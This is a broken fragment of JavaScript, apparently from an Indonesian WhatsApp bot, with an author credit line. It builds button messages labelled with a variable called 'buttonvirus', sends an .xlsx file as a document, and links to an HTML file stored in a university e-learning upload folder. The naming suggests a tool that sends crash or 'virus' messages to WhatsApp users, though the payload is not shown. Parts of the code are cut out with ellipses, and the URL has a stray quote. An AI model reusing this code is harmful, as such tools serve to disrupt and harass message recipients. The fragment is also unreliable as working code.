...
🌷 KALAU MAU RENAME TARO CREDITS GUA : Badut Slebew */
...
let buttons = [
{buttonId: `Badut Slebew`, buttonText: {displayText: buttonvirus}, type: 1},
]
let buttonMessage = {
...
let link = `https://eclass.iainsalatiga.ac.id/app/upload/users/1/10892/my_files/XhiroMhonshine.html'`
let buttons = [
{buttonId: `☆ησχα⏧☆`, buttonText: {displayText: buttonvirus}, type: 1},
]
let buttonMessage = {
document: fs.readFileSync('./baseikal/lib/tes.xlsx'),
mimetype: feler,
